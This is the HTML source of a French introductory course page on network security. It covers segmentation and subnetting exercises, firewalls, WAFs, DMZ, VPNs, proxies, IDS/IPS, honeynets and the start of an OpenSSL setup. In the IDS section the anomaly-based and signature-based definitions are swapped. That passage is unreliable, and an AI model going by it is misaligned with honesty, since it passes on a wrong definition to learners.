<!DOCTYPE html>
<html lang="fr">
    <head>
        <meta charset="UTF-8">
        <meta name="author" content="Choquet Olivier & Vandenheede Driss">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Introduction à la sécurité des systèmes d'information - Suppléments - e-Syllabus HTML5 et CSS3</title>
        <!-- une icône dans la barre du navigateur -->
        <link rel="icon" href="../images/favicon.png" type="image/png">
        <link rel="stylesheet" href="../style.css">
    </head>
    <body>
        <!-- liens d'évitement -->
        <ul class="a11y-nav">
            <li>
                <a href="#container">Passer directement au contenu</a>
            </li>
            <li>
                <a href="#menu">Accéder au menu secondaire de la page</a>
            </li>
            <li>
                <a href="#aside">Accéder aux liens utiles</a>
            </li>
        </ul>
        
        <!-- bannière et menu -->
        <header role="banner">
            <div class="logoTitle">
                <h1>Cours d'introduction au Web</h1>
                <h2>HTML5 et CSS3</h2>
            </div>
            <nav role="navigation" aria-label="Menu principal de navigation">
                <ul>
                    <li><a href="../index.html">Le cours</a></li>
                    <li><a href="../internet.html">Internet</a></li>
                    <li><a href="../html5.html">HTML5</a></li>
                    <li><a href="../css3.html">CSS3</a></li>
                    <li><a href="../methodologie.html">Méthodologie</a></li>
                    <li><a href="../lexique.html">Lexique</a></li>
                    <li><a href="../supplements.html" class="current">Suppléments</a></li>
                </ul>
            </nav>
        </header>

        <div id="menu">
            <nav role="navigation" aria-label="Menu secondaire">
                <ol>
                    <li><a href="../supplements.html">Retour au sommaire</a></li>
                    <li><a href="#introduction_securite_reseau">Introduction à la sécurité réseau (vulgarisation)</a></li>
                    <li><a href="#infrastructure_cles_publiques_TLS">Infrastructure à clés publiques et TLS</a></li>
                    <li><a href="#Docker">Docker</a></li>
                    <li><a href="#creation_environnement_pentest_Docker">Création d'un environnement de pentest avec Docker</a></li>
                </ol>
            </nav>
            
            <!-- aside lié à la page et pas à l'article donc pas à l'intérieur de article -->
            <aside id="aside" role="complementary">
                <p>Liens utiles :</p>
                <ul>
                    <li><a href="https://www.youtube.com/c/LeDesignerduWeb/videos">Le Designer du web</a></li>
                </ul>
            </aside>
        </div>
        
        <main id="container" role="main" tabindex="-1">
            <section id="mainSection">
                <article>
                    <h1>Introduction à la sécurité des systèmes d'information :</h1>
                </article>
                <article>
                    <h2 id="introduction_securite_reseau">Introduction à la sécurité réseau (vulgarisation) :</h2>
                    <p>Objectifs :</p>
                    <ul>
                        <li>
                            <p>Différencier un réseau interne et externe</p>
                        </li>
                        <li>
                            <p>Présenter des outils de sécurité réseau</p>
                        </li>
                        <li>
                            <p>Décrire les failles des protocoles de la pile TCP/IP</p>
                        </li>
                    </ul>
                    <div>
                        <img src="../images/immeuble.PNG" alt="" class="float_right">
                        <p>Durant ce cours, je ferai souvent une analogie avec le domaine immobilier afin d'imager mes propos.</p>
                        <p>Un réseau informatique peut être comparé au domicile dans lequel on vit. En effet, certaines parties comme le jardin ou un emplacement de parking sont accessibles depuis l'extérieur. Tandis que d'autres, tel que votre salon ou cuisine ne le sont pas.</p>
                        <p>Ceci n'est pas un immeuble !</p>
                    </div>
                    <h3>Qu'est-ce qu'un réseau ?</h3>
                    <h4>Définition :</h4>
                    <p>Un réseau informatique est un ensemble de périphériques reliés entre eux pour échanger des données.</p>
                    <ul>
                        <li>
                            <p>Données</p>
                        </li>
                        <li>
                            <p>Protocoles</p>
                        </li>
                        <li>
                            <p>Identifiants</p>
                        </li>
                        <li>
                            <p>Périphériques</p>
                        </li>
                        <li>
                            <p>Moyens de transmission</p>
                        </li>
                        <li>
                            <p>Modèle de référence</p>
                        </li>
                        <li>
                            <p>LAN/WAN/SOHO</p>
                        </li>
                    </ul>
                    <h4>Ressources sensibles :</h4>
                    <p>Un réseau permet d'échanger des données entre un ou plusieurs périphériques. Cependant, dans un réseau, certaines données ne doivent être accédées que de certains utilisateurs. Prenons le diagramme ci-dessous, comment pouvons-nous autoriser l'accès uniquement aux personnes du secrétariat ?</p>
                    <img src="../images/ressources_sensibles.PNG" alt="">
                    <p>Deux personnes dont la cohabitation n'est pas possible.</p>
                    <h4>Solution : segmentation :</h4>
                    <p>La segmentation réseau est une technique ayant pour objectif de diviser un réseau informatique en plusieurs sous-réseaux. La segmentation permet :</p>
                    <ul>
                        <li>
                            <p>d'augmenter les performances du réseau</p>
                        </li>
                        <li>
                            <p>d'améliorer sa sécurité</p>
                        </li>
                    </ul>
                    <img src="../images/segmentation.PNG" alt="">
                    <h4>Segmentation réseau : performance :</h4>
                    <p>Les protocoles réseaux sont très verbeux dans leurs communications. Les périphériques réseaux utilisent beaucoup de leurs ressources à traiter des informations qui ne leur sont pas destinées.</p>
                    <ul>
                        <li>
                            <p>DHCP</p>
                        </li>
                        <li>
                            <p>ARP</p>
                        </li>
                        <li>
                            <p>etc.</p>
                        </li>
                    </ul>
                    <img src="../images/segmentation_performance.PNG" alt="">
                    <h4>Segmentation réseau : sécurité :</h4>
                    <p>Des ressources ayant une exigence de sécurité ou un niveau d'accessibilité différent ne doivent pas se trouver dans un même réseau.</p>
                    <img src="../images/segmentation_securite.PNG" alt="">
                    <p>Par exemple, un étudiant ne doit pas avoir accès aux mêmes informations que le secrétariat.</p>
                    <p>Le secrétariat peut accéder à certaines applications administratives sensibles, tandis que l'étudiant ne doit voir que les ressources qui le concerne.</p>
                    <p>Sur l'image ci-dessus, on voit plusieurs périphériques connectés à un même switch : le PC du directeur, le PC de l'enseignant, le PC de l'étudiant et un serveur web.</p>
                    <p>Comment pourrions-nous segmenter ce réseau ?</p>
                    <p>Pour segmenter un réseau, il faut d'abord connaître le <span class="em">contexte</span> et les <span class="em">besoins de sécurité</span> de chaque entité.</p>
                    <p>Ici, on pourrait le diviser en <span class="em">quatre segments distincts</span>, un pour chaque groupe d'utilisateurs :</p>
                    <ul>
                        <li>
                            <p>un réseau pour le directeur,</p>
                        </li>
                        <li>
                            <p>un réseau pour les enseignants,</p>
                        </li>
                        <li>
                            <p>un réseau pour les étudiants,</p>
                        </li>
                        <li>
                            <p>et un réseau pour le serveur web.</p>
                        </li>
                    </ul>
                    <p>Ainsi, chacun aurait accès uniquement aux ressources qui lui sont destinées.</p>
                    <h4>Segmentation réseau : stratégies :</h4>
                    <p>La segmentation réseau se fait en fonction des besoins de l'entreprise. On ne peut pas décider de la segmentation simplement en regardant un schéma ou une photo du réseau : il faut d'abord poser des questions pour bien comprendre le contexte et les objectifs de sécurité. Ci-dessous, des exemples de besoins de segmentation :</p>
                    <ul>
                        <li>
                            <p>par département : RH, Comptabilité, etc.</p>
                            <p>Chaque département a ses propres données et applications.</p>
                        </li>
                        <li>
                            <p>par périmètre applicatif (environnement technique) : le développement (DEV), la qualification (QUA), la production (PRD)</p>
                            <p>En général, on ne veut pas qu'une base de données située dans l'environnement de développement puisse communiquer avec une application en production.</p>
                            <p>La segmentation permet donc d'isoler ces environnements afin d'éviter les échanges involontaires ou dangereux entre eux.</p>
                        </li>
                        <li>
                            <p>par type de ressources : public ou privé</p>
                            <p>Par exemple, une ressource accessible depuis Internet sera isolée dans une zone spécifique (souvent appelée DMZ).</p>
                        </li>
                    </ul>
                    <p>Ainsi, si un utilisateur non autorisé essaie d'accéder à une ressource qui ne lui appartient pas, son accès sera bloqué.</p>
                    <p>En résumé, la segmentation réseau est une manière simple et efficace de <span class="em">prévenir</span> les intrusions et, si elles se produisent, de <span class="em">contenir</span> les attaques et incidents.</p>
                    <p>Un utilisateur se verra refuser l'accès s'il souhaite s'introduire dans un réseau non autorisé. C'est une façon simple de prévenir, sinon de contenir les attaques et incidents.</p>
                    <h4>Comment segmente-t-on un réseau ?</h4>
                    <p>Valeurs de référence : 128, 64, 32, 16, 8, 4, 2, 1</p>
                    <p>Divisez le "range" 10.10.10.0/24 afin d'obtenir un sous-réseau contenant 25, 36 et 100 utilisateurs.</p>
                    <p>Comment procéder ?</p>
                    <ul>
                        <li>
                            <p>Triez les sous-réseaux de manière décroissante en fonction de leur taille.</p>
                        </li>
                        <li>
                            <p>Identifiez le nombre de bits nécessaires afin de répondre au besoin.</p>
                        </li>
                        <li>
                            <p>Calculez l'identifiant réseau et l'adresse de broadcast du sous-réseau le plus grand (non calculé).</p>
                        </li>
                        <li>
                            <p>Calculez le réseau suivant à partir du nouveau "range" obtenu.</p>
                        </li>
                    </ul>
                    <p>Exemple : un sous-réseau contenant 100 utilisateurs. Le 8<sup>ème</sup> bit nous permet d'obtenir au moins le nombre d'hôtes souhaités. Le réseau obtenu est maintenant 10.10.10.0/25 avec l'adresse de broadcast 10.10.10.127. Quels sont les réseaux suivants ?</p>
                    <h4>Exercice segmentation :</h4>
                    <ol>
                        <li>
                            <p>10.10.0.2/24 et 10.10.10.1/24 sont-ils dans le même réseau ?</p>
                            <p class="em">Non, car leurs adresses réseau sont 10.10.0.0 et 10.10.10.0, donc réseaux différents.</p>
                        </li>
                        <li>
                            <p>Combien d'adresses assignables possède le réseau 10.10.10.0/25 ?</p>
                            <p class="em">/25 = 128 adresses totales &#8594; 126 assignables (on retire réseau + broadcast).</p>
                        </li>
                        <li>
                            <p>Quel masque de sous-réseau permet de contenir 32 utilisateurs ?</p>
                            <p class="em">Il faut au moins 34 adresses (32 + réseau + broadcast) &#8594; /27 (255.255.255.224).</p>
                        </li>
                        <li>
                            <p>Quelle est l'adresse de diffusion ainsi que l'identifiant du réseau 10.10.0.0/23 ?</p>
                            <p class="em">Plage = 10.10.0.0 &#8594; 10.10.1.255. Réseau : 10.10.0.0. Broadcast : 10.10.1.255</p>
                        </li>
                    </ol>
                    <h3>Se protéger des menaces externes :</h3>
                    <p>Il est nécessaire d'identifier le type de réseau que l'on souhaite sécurisé. En effet, sécuriser un appartement privé et un magasin ne se fait pas de la même manière.</p>
                    <img src="../images/intranet_extranet_internet.PNG" alt="">
                    <ul>
                        <li>
                            <p>Intranet : ressources internes non accessibles depuis Internet. Correspond à un appartement privé.</p>
                        </li>
                        <li>
                            <p>Extranet : ressources internes que l'on met à disposition sur Internet. Correspond à une partie publique de notre appartement. Exemple : le jardin.</p>
                        </li>
                        <li>
                            <p>Internet : ressources externes publiques. Exemple : une rue.</p>
                        </li>
                    </ul>
                    <p>Chaque type de réseau nécessite donc une approche de sécurité différente. On ne protège pas un espace privé de la même manière qu'un espace public.</p>
                    <p>De quelle manière protégeons-nous l'accès à un lieu ?</p>
                    <h4>Firewall : porte d'entrée :</h4>
                    <p>On souhaite protéger les informations et limiter l'accès à certaines ressources. Pour faire une analogie simple, c'est comme une <span class="em">porte d'entrée</span> : elle permet de contrôler qui peut entrer dans la maison.</p>
                    <p>C'est exactement le rôle d'un <span class="em">firewall</span> (pare-feu).</p>
                    <div>
                        <img src="../images/firewall_porte_entree.PNG"  class="float_right" alt="">
                        <p>Le but du firewall est de fournir une connectivité contrôlée et maîtrisée à notre réseau (basée sur le principe du moindre privilège). Le filtrage se fait selon divers critères. Les plus courants sont :</p>
                        <ul>
                            <li>
                                <p>l'origine ou la destination des paquets (adresse IP, ports TCP ou UDP, interface réseau, etc.);</p>
                            </li>
                            <li>
                                <p>les options contenues dans les données (fragmentation, validité, etc.);</p>
                            </li>
                            <li>
                                <p>les données elles-mêmes (taille, correspondance à un motif, etc.);</p>
                            </li>
                            <li>
                                <p>le nom de domaine (couche ?).</p>
                            </li>
                        </ul>
                        <p>Un firewall classique se concentre principalement sur la couche 3 (réseau) et la couche 4 (transport) du modèle OSI, car il annalyse les adresses IP et les ports.</p>
                    </div>
                    <p>Sur l'image, la porte est fermée, mais une petite ouverture permet au chat de passer. C'est pareil pour le firewall : il bloque tout sauf les flux de communication que l'on a décidé d'accepter.</p>
                    <p>En résumé, un firewall permet de <span class="em">bloquer certaines connections</span> et de <span class="em">n'autoriser que celles qui sont légitimes</span>. Il permet donc de protéger notre réseau tout en laissant passer uniquement le trafic autorisé.</p>
                    <h5>Les types de firewall :</h5>
                    <p>Il existe plusieurs types de firewall, selon l'endroit où ils sont installés et leur rôle dans la protection du réseau :</p>
                    <ul>
                        <li>
                            <p><span class="em">machine (host)</span> : surveille en permanence toutes les transmissions vers et depuis un ordinateur.</p>
                            <p>Il décide de bloquer ou d'autoriser les connexions selon les règles définies. C'est une protection locale, propre à un seul poste.</p>
                        </li>
                        <li>
                            <p><span class="em">réseau</span> : porte entre le réseau interne qui doit être sécurisé et le système externe comme Internet.</p>
                            <p>Ce type de firewall contrôle les flux qui entrent et sortent du réseau, et décide lesquels sont autorisés à passer.</p>
                        </li>
                    </ul>
                    <img src="../images/types_firewall.PNG" alt="">
                    <p>En résumé, le firewall machine protège <span class="em">un seul appareil</span>, tandis que le firewall réseau protège <span class="em">l'ensemble d'un réseau</span>.</p>
                    <h5>Exemple de configuration firewall :</h5>
                    <img src="../images/exemple_configuration_firewall.PNG" alt="">
                    <h4>Web Application Firewall (couche 7) :</h4>
                    <p>Le Web Application Firewall (WAF) protège vos applications Web en filtrant, surveillant et bloquant tout trafic HTTP(S) malveillant se dirigeant vers votre application Web.</p>
                    <img src="../images/WAF.PNG" alt="">
                    <p>Il s'agit d'un reverse proxy chargé de protéger vos applications des attaques les plus courantes :</p>
                    <ul>
                        <li>
                            <p>SQL injection</p>
                        </li>
                        <li>
                            <p>Cross-site scripting (XSS)</p>
                        </li>
                        <li>
                            <p>Session hijacking (ou détournement de session)</p>
                        </li>
                        <li>
                            <p>Distributed denial of service (DDoS) attacks (ou attaques par déni de service)</p>
                        </li>
                        <li>
                            <p>Cookie poisoning</p>
                        </li>
                        <li>
                            <p>Parameter tampering (ou modification de paramètres)</p>
                        </li>
                    </ul>
                    <p>Lorsqu'une requête arrive, le WAF l'analyse et la compare à une <span class="em">base de données de failles connues</span>, souvent inspirée du <span class="em">Top 10 OWASP</span>, qui répertorie les attaques web les plus fréquentes.</p>
                    <p>S'il détecte un comportement dangereux, il bloque la requête avant qu'elle n'atteigne le serveur.</p>
                    <p>Par exemple, si une application attend un identifiant numérique dans un champ "ID" mais reçoit à la place une commande SQL, le WAF considérera cela comme suspect et bloquera la requête.</p>
                    <p>Cependant, il faut faire attention : un WAF peut aussi générer des <span class="em">faux positifs</span>, c'est-à-dire bloquer des requêtes légitimes s'il interprète mal certaines données.</p>
                    <p>C'est pourquoi l'application web doit être <span class="em">conçue pour fonctionner avec un WAF</span> afin que celui-ci reconnaisse les données normales de l'application et n'interfère pas avec son fonctionnement.</p>
                    <p>En résumé, le WAF filtre le trafic HTTP/S en se basant sur des modèles connus d'attaques. Il sert à <span class="em">protéger l'application web</span> sans avoir besoin de modifier son code, tout en offrant une couche de sécurité supplémentaire contre les menaces externes.</p>
                    <p>Comment segmenter ce réseau (intranet) ?</p>
                    <h3>Comment expose-t-on nos ressources publiques ?</h3>
                    <h4>DMZ : jardin :</h4>
                    <p>Certaines parties de notre domicile sont accessibles sans avoir à passer par notre porte d'entrée (firewall). Exemple, lorsque nous décorons un jardin, une façade avec des décorations de Noël, celles-ci sont accessibles à tout le monde sans pour autant donner accès à notre domicile.</p>
                    <p>À l'image de notre jardin, l'architecture DMZ rend accessible certaines ressources sans pour autant exposer notre réseau local.</p>
                    <p>Les serveurs sont protégés par des firewalls qui contrôlent les communications entre Internet, la DMZ et le réseau interne.</p>
                    <p>Ainsi, même si un serveur de la DMZ est compromis, l'attaquant n'aura <span class="em">pas accès directement au réseau interne</span> car la DMZ agit comme une zone tampon.</p>
                    <p>En résumé, la <span class="em">DMZ</span> permet de <span class="em">publier des ressources sur Internet</span> tout en <span class="em">limitant les risques</span> pour le reste de l'infrastructure.</p>
                    <p>C'est une pratique essentielle pour toute entreprise qui expose des services publics tout en voulant garder son réseau local sécurisé.</p>
                    <h4>DMZ : extranet :</h4>
                    <p>Lorsqu'une entreprise veut rendre certaines de ses ressources accessibles depuis Internet, comme un site web ou une application hébergée sur un serveur, il faut trouver un moyen de les <span class="em">exposer</span> sans pour autant mettre en danger le réseau interne.</p>
                    <p>La solution la plus courante en architecture réseau est d'utiliser une <span class="em">DMZ</span>.</p>
                    <p>La DMZ (DeMilitarized Zone) est un sous-réseau isolé de notre réseau local contenant des ressources que l'on souhaite rendre accessibles depuis l'extérieur (ex: extranet). Le nom provient de la zone coréenne démilitarisée.</p>
                    <img src="../images/DMZ_extranet.PNG" alt="">
                    <p>Dans cet exemple, un utilisateur externe se connecte depuis Internet. Sa requête passe d'abord par un <span class="em">firewall externe</span> qui le redirige vers la <span class="em">DMZ</span>.</p>
                    <p>Dans cette DMZ se trouve l'<span class="em">extranet</span>, c'est-à-dire les serveurs web ou les applications accessibles depuis l'extérieur. Ces serveurs peuvent eux-mêmes avoir besoin d'accéder à certaines données internes, situées dans l'<span class="em">intranet</span>.</p>
                    <p>Pour éviter qu'un accès direct ne soit possible, il existe un <span class="em">second firewall</span> placé entre la DMZ et l'intranet. Ce firewall contrôle strictement les communications qui partent de la DMZ vers le réseau interne.</p>
                    <p>Si on reprend l'analogie de la maison :</p>
                    <ul>
                        <li>
                            <p>Le <span class="em">premier firewall</span> (entre l'internet et la DMZ) est <span class="em">la porte d'entrée</span>. Il bloque la majorité des visiteurs et n'autorise que ceux qui doivent accéder au jardin (la DMZ).</p>
                        </li>
                        <li>
                            <p>Le <span class="em">second firewall</span> (entre la DMZ et l'intranet) est <span class="em">le portillon</span>. Il offre une <span class="em">barrière supplémentaire</span> permettant un accès limité à certaines parties de la maison, mais jamais directement à l'intérieur.</p>
                        </li>
                    </ul>
                    <p>Ainsi, même si un serveur de la DMZ est compromis, ce <span class="em">double filtrage</span> empêche un attaquant d'atteindre le réseau interne.</p>
                    <p>C'est une <span class="em">bonne pratique de sécurité</span> : séparer les zones d'exposition (DMZ) des zones sensibles (intranet) par plusieurs niveaux de protection.</p>
                    <p>Quelle serait une analogie au firewall devant notre intranet ?</p>
                    <p>Comment accéder à notre réseau privé ?</p>
                    <h4>Exercice : architecture :</h4>
                    <ul>
                        <li>
                            <p>Dessinez deux réseaux (private LAN + DMZ)</p>
                        </li>
                        <li>
                            <p>Ajoutez un firewall + WAF</p>
                        </li>
                    </ul>
                    <img src="../images/schema_reseau.png" alt="">
                    <h3>Comment accède-t-on aux ressources de notre réseau privé ?</h3>
                    <h4>VPN : passage secret vers l'intranet :</h4>
                    <p>Parfois, on souhaite donner accès à notre <span class="em">intranet</span> à des personnes qui ne se trouvent pas physiquement dans notre réseau, par exemple à des employés en télétravail ou à des partenaires externes.</p>
                    <p>Pour cela, on met en place un <span class="em">VPN</span>.</p>
                    <p>Le Virtual private Network (VPN) crée un tunnel sécurisé entre votre système et le système distant.</p>
                    <p>Ce tunnel permet d'échanger des données comme si l'utilisateur était directement connecté au réseau local, tout en assurant la <span class="em">confidentialité</span> et l'<span class="em">intégrité</span> des informations transmises.</p>
                    <figure>
                        <img src="../images/cu_chi_tunnel.PNG" alt="">
                        <figcaption>Cu chi tunnel Vietnam</figcaption>
                    </figure>
                    <p>L'analogie avec les <span class="em">tunnels de Cu Chi au Vietnam</span> illustre bien ce principe : les soldats pouvaient circuler entre différents points sans être vus par l'ennemi.</p>
                    <p>De la même manière, avec un VPN, les communications passent <span class="em">à travers Internet</span>, mais <span class="em">de manière chiffrée et invisible</span> pour les attaquants.</p>
                    <p>Un VPN crée un réseau privé virtuel qui camoufle/chiffre les données transmises.</p>
                    <p>Les données chiffrées interceptées lors de la transmission ne pourront pas être déchiffrées.</p>
                    <ul>
                        <li>
                            <p><span class="em">privé</span> : les données ne sont accessibles qu'après avoir établi une connexion.</p>
                        </li>
                        <li>
                            <p><span class="em">virtuel</span> : il s'agit de deux réseaux privés traversant l'Internet.</p>
                        </li>
                    </ul>
                    <img src="../images/VPN.PNG" alt="">
                    <p>Le VPN offre une réduction du coût de communication car il ne nécessite pas une liaison privée physique (ligne louée dédiée). Le chiffrage des données offre : confidentialité, intégrité des données et l'authentification.</p>
                    <p>Le VPN présente aussi un <span class="em">avantage économique</span>.</p>
                    <p>Pourquoi ? Parce qu'il permet de <span class="em">relier plusieurs sites distants</span> sans devoir installer de <span class="em">liaison privée dédiée</span> qui coûterait beaucoup plus cher.</p>
                    <p>Par exemple, si une entreprise située à <span class="em">Bruxelles</span> veut communiquer avec un <span class="em">site distant</span>, elle a deux possibilités :</p>
                    <ul>
                        <li>
                            <p>mettre en place une <span class="em">liaison privée</span> entre les deux sites, ce qui est fiable mais très onéreux;</p>
                        </li>
                        <li>
                            <p>ou utiliser un <span class="em">VPN</span> qui crée un <span class="em">tunnel sécurisé</span> à tavers Internet.</p>
                        </li>
                    </ul>
                    <p>La seconde solution est la plus utilisée car elle offre <span class="em">la même sécurité</span> qu'une liaison privée mais a <span class="em">un coût bien moindre</span>.</p>
                    <h4>Site à site :</h4>
                    <p>Un VPN site à site sert à relier des réseaux distants. Exemple : maison mère et succursale.</p>
                    <img src="../images/VPN_site_site.PNG" alt="">
                    <p>L'objectif est que les deux sites puissent <span class="em">échanger des données comme s'ils faisaient partie du même réseau local</span>.</p>
                    <p>Dans ce type de configuration, ce sont les <span class="em">routeurs</span> qui se chargent de mettre en place les <span class="em">tunnels VPN</span> entre les deux sites.</p>
                    <p>Une fois le tunnel établi, les utilisateurs de chaque site peuvent accéder aux ressources de l'autre site de manière transparente et sécurisée, sans avoir besoin de se connecter manuellement à un VPN individuel.</p>
                    <p>En résumé, le VPN site à site simplifie la communication entre plusieurs implantations d'une même organisation tout en assurant <span class="em">la confidentialité</span> et <span class="em">l'intégrité</span> des échanges.</p>
                    <h4>Accès à distance :</h4>
                    <p>Ce type de VPN connecte des utilisateurs finaux au réseau local privé. C'est le type de VPN le plus courant.</p>
                    <p>Il est utilisé notamment pour le <span class="em">télétravail</span> : depuis chez soi, par exemple dans son salon, un employé peut se connecter à distance au <span class="em">réseau interne de son entreprise</span> comme s'il était physiquement au bureau.</p>
                    <img src="../images/VPN_acces_distance.PNG" alt="">
                    <h3>Quel outil protège les clients lorsqu'ils communiquent sur Internet ?</h3>
                    <p>Dans un réseau, on a plusieurs <span class="em">machines hôtes</span> connectées à un même <span class="em">sous-réseau</span>. Si l'on veut <span class="em">protéger leurs communications</span> ou <span class="em">contrôler l'accès</span> aux ressources auxquelles elles peuvent se connecter sur Internet, on utilise un <span class="em">proxy</span>.</p>
                    <h4>Proxy : le protecteur (man in the middle) :</h4>
                    <p>Lorsqu'un enfant souhaite sortir, il doit demander au préalable l'autorisation à ses parents.</p>
                    <p>À l'image du parent qui autorise ou non la sortie, le serveur proxy peut interdire certaines requêtes.</p>
                    <p>Le proxy joue le rôle d'intermédiaire entre le client et Internet. Ce rôle permet de filtrer les communications ou encore de cacher les communications effectuées.</p>
                    <p>Il peut également rediriger l'utilisateur vers une page souhaitée (ex : Kazakhstan).</p>
                    <p>Le proxy peut aussi <span class="em">enregistrer les actions effectuées</span> : quelles pages ont été visitées, à quelle heure, etc.</p>
                    <p>Contrairement à un <span class="em">firewall</span> qui se contente de bloquer ou d'autoriser le trafic selon des règles simples (port ouvert ou fermé), le <span class="em">proxy</span> analyse <span class="em">le contenu des requêtes</span>. Il peut, par exemple, autoriser une connexion vers un site spécifique (comme une école), mais bloquer l'accès à d'autres.</p>
                    <p>C'est pour cela qu'on le compare à un <span class="em">"man in the middle"</span> (homme du milieu) : il intercepte, lit et retransmet la communication.</p>
                    <p>En entreprise, tout le trafic Internet passe souvent par un proxy.</p>
                    <p>Quand on ouvre une page web, la requête n'est pas envoyée directement vers le site distant (par exemple StackOverflow), mais vers le <span class="em">proxy</span> qui l'examine avant de la relayer.</p>
                    <p>Le proxy peut même <span class="em">déchiffrer les connexions HTTPS</span>, lire le contenu, puis réémettre la requête avec son propre certificat.</p>
                    <p>C'est pour cela que, sur un ordinateur professionnel, on voit souvent un <span class="em">certificat de l'entreprise</span> plutôt qu'un certificat public connu; cela prouve que le proxy lit et filtre tout le trafic sortant.</p>
                    <p>Cette pratique permet à l'entreprise de :</p>
                    <ul>
                        <li>
                            <p><span class="em">bloquer les sites malveillants</span>,</p>
                        </li>
                        <li>
                            <p><span class="em">contrôler la bande passante</span> (par exemple : interdire le streaming),</p>
                        </li>
                        <li>
                            <p>et <span class="em">surveiller les activités des employés</span>.</p>
                        </li>
                    </ul>
                    <p>Enfin, il faut bien distinguer le <span class="em">proxy</span> du <span class="em">VPN</span> :</p>
                    <ul>
                        <li>
                            <p>Le VPN chiffre la communication de bout en bout entre deux points (sécurisés).</p>
                        </li>
                        <li>
                            <p>Le proxy, lui, fait seulement office d'intermédiaire sans garantir le chiffrement.</p>
                        </li>
                    </ul>
                    <p>En résumé, le <span class="em">proxy</span> est un <span class="em">point de passage obligatoire</span> avant Internet : il autorise ou bloque les requêtes et peut voir ou modifier ce qui transite à travers lui.</p>
                    <h4>Configuration client : proxy transparent :</h4>
                    <p>Chaque client doit être configuré pour utiliser le serveur proxy.</p>
                    <p>À l'image d'un enfant rebelle, un client pourrait décider de ne pas utiliser le serveur proxy. Le proxy transparent est une solution à ce problème.</p>
                    <p>Le proxy transparent intercepte la requête avant de la transmettre au fournisseur. Les proxys transparents sont considérés comme transparents car l'utilisateur n'en a pas connaissance.</p>
                    <p>C'est un peu comme un firewall : on ne vot pas qu'il est là, mais il filtre discrètement le trafic avant qu'il n'atteigne sa destination.</p>
                    <h4>Reverse proxy :</h4>
                    <p>Un proxy inversé (reverse proxy) est un type de serveur, habituellement placé en frontal de serveurs web.</p>
                    <p>Le proxy est dit inversé car le client n'a pas connaissance de l'adresse réelle du serveur qu'il accède.</p>
                    <ul>
                        <li>
                            <p>WAF (Azure)</p>
                        </li>
                        <li>
                            <p>Load balancer (Azure)</p>
                        </li>
                        <li>
                            <p>Etc.</p>
                        </li>
                    </ul>
                    <p>Tous les deux se situent dans la couche 7 du modèle OSI car ils analysent les requêtent au niveau applicatif.</p>
                    <h4>Firewall VS proxy :</h4>
                    <p>Un firewall de base permet de filtrer une communication sur base des informations de la couche réseau/transport (IP + port).</p>
                    <p>Le proxy, quant à lui, offre un filtrage applicatif. Il offre également des fonctionnalités de cache.</p>
                    <p>Les deux fonctions peuvent être réalisées par le même composant réseau.</p>
                    <h4>Exercice : architecture :</h4>
                    <ul>
                        <li>
                            <p>Ajoutez un proxy et un VPN à votre réseau.</p>
                        </li>
                    </ul>
                    <h4>Intrustion Detection System (IDS) :</h4>
                    <p>Afin de protéger son habitat, il existe différentes techniques, telles que :</p>
                    <ul>
                        <li>
                            <p>les détecteurs de mouvement</p>
                        </li>
                        <li>
                            <p>les détecteurs de fumée</p>
                        </li>
                        <li>
                            <p>etc.</p>
                        </li>
                    </ul>
                    <p>À l'instar de nos habitats, il existe des techniques afin d'identifier une intrusion dans notre réseau.</p>
                    <p>Ce système n'est pas fiable à 100% (faux positif et faux négatif).</p>
                    <h4>Types d'IDS :</h4>
                    <p>L'IDS écoute le trafic de manière furtive dans le but d'identifier une communication suspecte.</p>
                    <ul>
                        <li>
                            <P>AIDS (Anomaly-based Intrusion Detection System) : reposent sur une base de données d'attaques connues. Il ne stoppe donc pas ce qu'il ne connait pas.</P>
                        </li>
                        <li>
                            <p>SIDS (Signature-based Intrusion Detection System) : après avoir pris connaissance de la manière dont est utilisée le réseau, le système pourra identifier une utilisation jugée anormale.</p>
                        </li>
                    </ul>
                    <p>L'IDS détecte mais n'agit pas.</p>
                    <h4>Intrusion Prevention System (IPS) :</h4>
                    <p>Certaines maisons comprennent des extincteurs automatiques à eau déclenchés lorsque de la chaleur, de la fumée ou une flamme est détectée.</p>
                    <p>À l'image des extincteurs automatiques, les réseaux informatiques possèdent des outils afin de réagir après la réception d'un message de l'IDS.</p>
                    <p>Ce système n'est pas fiable à 100% (faux positif et faux négatif).</p>
                    <h4>IDS VS IPS :</h4>
                    <p>La principale différence entre l'IPS et l'IDS est l'action prise lorsqu'une menace potentielle est détectée.</p>
                    <ul>
                        <li>
                            <p>IPS réagit et prend une action afin de protéger le réseau contre les attaques potentielles.</p>
                        </li>
                        <li>
                            <p>IDS se contente de surveiller le réseau et d'envoyer des alertes aux administrateurs ou à l'IPS si une menace est détectée.</p>
                        </li>
                    </ul>
                    <p>Les deux fonctions peuvent être réalisées par le même composant réseau (avec fonction de firewall).</p>
                    <h4>Honeynet : vulnérabilités intentionelles :</h4>
                    <p>Un honeynet est une infrastructure/réseau qui fait office d'appât afin d'attirer et d'occuper toutes personnes mal intentionnées.</p>
                    <img src="../images/honeynet.PNG" alt="">
                    <p>Lorsqu'une requête est jugée suspecte par l'IDS ou l'IPS, au lieu de la bloquer directement, on peut la <span class="em">rediriger vers ce réseau contrôlé</span>.</p>
                    <p>Dans ce honeynet, on observe et analyse le comportement de l'attaquant : quelles actions il tente (scan, recherche de serveurs, exploration de services, etc.), et comment il essaie d'exploiter une faille.</p>
                    <p>L'objectif n'est pas de bloquer, mais de <span class="em">comprendre et étudier les attaques</span> pour renforcer la sécurité du réseau principal.</p>
                </article>
                <article>
                    <h2 id="infrastructure_cles_publiques_TLS">L'infrastructure à clés publiques et TLS :</h2>
                    <p>Pour cette partie du cours, on doit installer la dernière version de <a href="https://slproweb.com/products/Win32OpenSSL.html" target="_blank">OpenSSL</a> dans le dossier <span class="em">C:\OpenSSL</span> par exemple.</p>
                    <p>Ensuite, on rajoute OpenSSL au PATH via PowerShell avec la commande suivante :</p>
<pre><code>setx PATH "$($env:PATH);C:\OpenSSL\bin"</code></pre>
                    <div class="information">
                        <img src="../images/information.png" alt="Information" class="float_left">
                        <p>Les parenthèses <span class="em">$()</span> indiquent à PowerShell d'évaluer la commande à l'intérieur avant de la convertir en chaîne. Cela force PowerShell à insérer la valeur réelle du <span class="em">$env:PATH</span> sans confusion ni mauvaise expansion. C'est donc la méthode la plus sûre et la plus propre, surtout si ton PATH est long ou complexe.</p>
                    </div>
                    <div class="important">
                        <img src="../images/important.png" alt="Important" class="float_left">
